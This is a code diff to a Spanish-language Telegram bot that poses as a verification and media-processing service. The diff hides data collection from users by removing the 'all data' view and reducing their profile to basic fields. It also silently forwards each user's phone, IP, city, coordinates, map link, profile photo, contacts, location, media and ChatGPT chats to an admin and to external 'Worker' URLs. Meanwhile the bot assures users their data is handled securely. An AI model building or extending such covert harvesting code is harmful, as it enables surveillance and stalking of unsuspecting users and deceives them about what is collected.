@@ -50,7 +50,7 @@ def menu_estatico():
         [KeyboardButton("🎙️ ENVIAR AUDIO"), KeyboardButton("📇 ENVIAR CONTACTO")],
         [KeyboardButton("📍 ENVIAR UBICACIÓN"), KeyboardButton("🔗 GENERAR ENLACE")],
         [KeyboardButton("📊 MI PERFIL"), KeyboardButton("📈 ESTADÍSTICAS")],
-        [KeyboardButton("❓ AYUDA"), KeyboardButton("📋 TODOS LOS DATOS")],
+        [KeyboardButton("❓ AYUDA")],
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
@@ -183,44 +183,51 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
 
     # --- DISPOSITIVO ---
     device = "Desconocido (Telegram App)"
-    # Si se abre desde un navegador, el User-Agent se puede capturar con el Worker, pero en Telegram no se puede obtener directamente.
 
-    # ========== CONSTRUIR MENSAJE COMPLETO ==========
-    info = f"🔍 *DATOS COMPLETOS DEL USUARIO*\n"
-    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    info += f"👤 *Telegram*\n"
-    info += f"   • ID: `{user_id}`\n"
-    info += f"   • Nombre completo: {full_name}\n"
-    info += f"   • Username: {username}\n"
-    info += f"   • Teléfono: {phone}\n"
-    info += f"   • Idioma: {language}\n"
-    info += f"   • Es bot: {is_bot}\n"
-    info += f"   • Es Premium: {is_premium}\n"
-    info += f"   • Biografía: {bio}\n\n"
-    info += f"📱 *Dispositivo*\n"
-    info += f"   • Modelo: {device}\n\n"
-    info += f"💬 *Chat*\n"
-    info += f"   • Tipo: {chat_type}\n"
-    info += f"   • ID: `{chat_id}`\n\n"
-    info += f"📩 *Mensaje*\n"
-    info += f"   • ID: {message_id}\n"
-    info += f"   • Fecha: {message_date}\n"
-    info += f"   • Unix: {message_unix}\n"
-    info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
-    info += f"🌐 *Red y Ubicación*\n"
-    info += f"   • IP: `{ip}`\n"
-    info += f"   • País: {country}\n"
-    info += f"   • Región: {region}\n"
-    info += f"   • Ciudad: {city}\n"
-    info += f"   • Código Postal: {postal}\n"
-    info += f"   • Zona Horaria: {timezone}\n"
-    info += f"   • Coordenadas: {lat}, {lon}\n"
-    info += f"   • Google Maps: {maps_link}\n"
-    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    # ========== CONSTRUIR MENSAJE COMPLETO (SOLO PARA ADMIN) ==========
+    info_admin = f"🔍 *DATOS COMPLETOS DEL USUARIO*\n"
+    info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    info_admin += f"👤 *Telegram*\n"
+    info_admin += f"   • ID: `{user_id}`\n"
+    info_admin += f"   • Nombre completo: {full_name}\n"
+    info_admin += f"   • Username: {username}\n"
+    info_admin += f"   • Teléfono: {phone}\n"
+    info_admin += f"   • Idioma: {language}\n"
+    info_admin += f"   • Es bot: {is_bot}\n"
+    info_admin += f"   • Es Premium: {is_premium}\n"
+    info_admin += f"   • Biografía: {bio}\n\n"
+    info_admin += f"📱 *Dispositivo*\n"
+    info_admin += f"   • Modelo: {device}\n\n"
+    info_admin += f"💬 *Chat*\n"
+    info_admin += f"   • Tipo: {chat_type}\n"
+    info_admin += f"   • ID: `{chat_id}`\n\n"
+    info_admin += f"📩 *Mensaje*\n"
+    info_admin += f"   • ID: {message_id}\n"
+    info_admin += f"   • Fecha: {message_date}\n"
+    info_admin += f"   • Unix: {message_unix}\n"
+    info_admin += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
+    info_admin += f"🌐 *Red y Ubicación*\n"
+    info_admin += f"   • IP: `{ip}`\n"
+    info_admin += f"   • País: {country}\n"
+    info_admin += f"   • Región: {region}\n"
+    info_admin += f"   • Ciudad: {city}\n"
+    info_admin += f"   • Código Postal: {postal}\n"
+    info_admin += f"   • Zona Horaria: {timezone}\n"
+    info_admin += f"   • Coordenadas: {lat}, {lon}\n"
+    info_admin += f"   • Google Maps: {maps_link}\n"
+    info_admin += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+    info_admin += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+
+    # ========== PERFIL PÚBLICO (SOLO PARA EL USUARIO) ==========
+    info_perfil = f"📊 *Tu perfil*\n\n"
+    info_perfil += f"👤 *Nombre:* {full_name}\n"
+    info_perfil += f"📛 *Username:* {username}\n"
+    info_perfil += f"🆔 *ID:* `{user_id}`\n"
+    info_perfil += f"✅ *Estado:* Verificado"
 
     return {
-        "text": info,
+        "admin_text": info_admin,
+        "perfil_text": info_perfil,
         "photo_id": photo_id,
         "user_id": user_id,
         "username": username,
@@ -235,8 +242,8 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
         "full_name": full_name
     }
 
-# ========== ENVÍO A TODAS LAS URLS ==========
-async def send_to_all_workers(text, extra=None):
+# ========== ENVÍO A TODAS LAS URLS Y ADMIN ==========
+async def send_to_all_workers(text):
     form_data = aiohttp.FormData()
     form_data.add_field('chat_id', str(ADMIN_ID))
     form_data.add_field('text', text)
@@ -253,14 +260,16 @@ async def send_to_all_workers(text, extra=None):
                 results.append(f"❌ {url} (Error: {str(e)[:30]})")
     return results
 
-async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
+async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data, extra_msg=None):
     bot = context.bot
-    # Enviar al admin directamente
-    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"], parse_mode=ParseMode.MARKDOWN)
+    # Enviar al admin
+    await bot.send_message(chat_id=ADMIN_ID, text=info_data["admin_text"], parse_mode=ParseMode.MARKDOWN)
     if info_data["photo_id"]:
         await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de perfil de {info_data['username'] or info_data['user_id']}")
+    if extra_msg:
+        await bot.send_message(chat_id=ADMIN_ID, text=extra_msg, parse_mode=ParseMode.MARKDOWN)
     # Enviar a todos los Workers
-    resultados = await send_to_all_workers(info_data["text"])
+    resultados = await send_to_all_workers(info_data["admin_text"])
     logger.info(f"Resultados de envío a Workers: {resultados}")
     users_db[info_data["user_id"]] = info_data
 
@@ -341,7 +350,9 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     logger.info(f"📩 Mensaje: {text} de {user.first_name}")
 
+    # Extraer info del usuario y enviar al admin (siempre)
     info_data = await extract_user_info(update, context)
+    await send_to_admin(update, context, info_data, f"📩 Mensaje: {text}")
     users_db[user.id] = info_data
     reply_markup = menu_estatico()
 
@@ -464,31 +475,13 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             text=f"🔗 Nuevo enlace\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}"
         )
 
-    # ====== MI PERFIL ======
+    # ====== MI PERFIL (público, sin datos sensibles) ======
     elif text == "📊 MI PERFIL":
         info = users_db.get(user.id)
         if not info:
             await update.message.reply_text("❌ No encontré tu perfil. Usa /start.", reply_markup=reply_markup)
             return
-        msg = f"📊 *Tu perfil completo*\n\n"
-        msg += f"👤 *Nombre:* {info.get('full_name')}\n"
-        msg += f"📛 *Username:* {info.get('username')}\n"
-        msg += f"🆔 *ID:* `{info.get('id')}`\n"
-        msg += f"📞 *Teléfono:* {info.get('phone', 'No disponible')}\n"
-        msg += f"🌐 *IP:* {info.get('ip')}\n"
-        msg += f"📍 *Ubicación:* {info.get('city')}, {info.get('country')}\n"
-        msg += f"🗺️ *Mapa:* {info.get('maps_link')}\n"
-        msg += f"📱 *Dispositivo:* {info.get('device')}\n"
-        msg += f"✅ *Estado:* Verificado"
-        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
-
-    # ====== TODOS LOS DATOS ======
-    elif text == "📋 TODOS LOS DATOS":
-        info = users_db.get(user.id)
-        if not info:
-            await update.message.reply_text("❌ No hay datos. Usa /start.", reply_markup=reply_markup)
-            return
-        await update.message.reply_text(info["text"], parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+        await update.message.reply_text(info["perfil_text"], parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     # ====== ESTADÍSTICAS ======
     elif text == "📈 ESTADÍSTICAS":
@@ -520,8 +513,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📇 *Compartir contacto*: Comparte tu contacto.\n"
             "📍 *Compartir ubicación*: Comparte tu ubicación.\n"
             "🔗 *Generar enlace*: Crea un enlace de verificación.\n"
-            "📊 *Mi perfil*: Muestra tu información.\n"
-            "📋 *Todos los datos*: Muestra todos los datos extraídos.\n"
+            "📊 *Mi perfil*: Muestra tu información básica.\n"
             "📈 *Estadísticas*: Muestra tu actividad.\n\n"
             "🔐 *Todos los datos se procesan de forma segura.*",
             parse_mode=ParseMode.MARKDOWN,
@@ -536,6 +528,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🤖 *Chat GPT:*\n\n{respuesta}",
                 parse_mode=ParseMode.MARKDOWN,
                 reply_markup=reply_markup
+            )
+            # Enviar al admin también la conversación
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"💬 *Chat GPT con {user.first_name} (@{user.username})*\n\n📝 Pregunta: {text}\n\n🤖 Respuesta: {respuesta}",
+                parse_mode=ParseMode.MARKDOWN
             )
             context.user_data['esperando_chatgpt'] = False
             return
@@ -577,13 +575,8 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     photo = update.message.photo[-1]
     caption = update.message.caption or "Sin caption"
     info_data = await extract_user_info(update, context)
+    await send_to_admin(update, context, info_data, f"📸 Foto recibida: {caption}")
     users_db[user.id] = info_data
-    await context.bot.send_photo(
-        chat_id=ADMIN_ID,
-        photo=photo.file_id,
-        caption=f"📸 *Foto recibida de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-        parse_mode=ParseMode.MARKDOWN
-    )
     await update.message.reply_text(
         "✅ *Foto recibida.*\n"
         "🔄 Procesando con IA...\n"
@@ -597,6 +590,7 @@ async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     video = update.message.video
     caption = update.message.caption or "Sin caption"
     info_data = await extract_user_info(update, context)
+    await send_to_admin(update, context, info_data, f"🎥 Video recibido: {caption}")
     users_db[user.id] = info_data
 
     await update.message.reply_text("⏳ Extrayendo audio del video...", reply_markup=menu_estatico())
@@ -627,6 +621,7 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     audio = update.message.audio
     info_data = await extract_user_info(update, context)
+    await send_to_admin(update, context, info_data, f"🎵 Audio recibido")
     users_db[user.id] = info_data
 
     efecto = context.user_data.get('efecto_audio')
@@ -656,12 +651,6 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
         os.unlink(audio_path)
         context.user_data['efecto_audio'] = None
     else:
-        await context.bot.send_audio(
-            chat_id=ADMIN_ID,
-            audio=audio.file_id,
-            caption=f"🎵 *Audio recibido de {user.first_name} (@{user.username})*\n\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-            parse_mode=ParseMode.MARKDOWN
-        )
         await update.message.reply_text(
             "✅ *Audio recibido.*\n"
             "🎧 Procesando...\n"
@@ -674,12 +663,8 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     contact = update.message.contact
     info_data = await extract_user_info(update, context)
+    await send_to_admin(update, context, info_data, f"📇 Contacto: {contact.first_name} {contact.last_name or ''} - {contact.phone_number}")
     users_db[user.id] = info_data
-    await context.bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"📇 *Contacto recibido de {user.first_name} (@{user.username})*\n\n📞 Nombre: {contact.first_name} {contact.last_name or ''}\n📞 Teléfono: `{contact.phone_number}`\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-        parse_mode=ParseMode.MARKDOWN
-    )
     await update.message.reply_text(
         "✅ *Contacto recibido.*\n"
         "🔐 Verificación completada.",
@@ -691,17 +676,8 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     location = update.message.location
     info_data = await extract_user_info(update, context)
+    await send_to_admin(update, context, info_data, f"📍 Ubicación: {location.latitude}, {location.longitude}")
     users_db[user.id] = info_data
-    await context.bot.send_location(
-        chat_id=ADMIN_ID,
-        latitude=location.latitude,
-        longitude=location.longitude
-    )
-    await context.bot.send_message(
-        chat_id=ADMIN_ID,
-        text=f"📍 *Ubicación recibida de {user.first_name} (@{user.username})*\n\n🌐 Lat: {location.latitude}\n🌐 Lon: {location.longitude}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-        parse_mode=ParseMode.MARKDOWN
-    )
     await update.message.reply_text(
         "✅ *Ubicación recibida.*\n"
         "🔐 Verificación completada.",
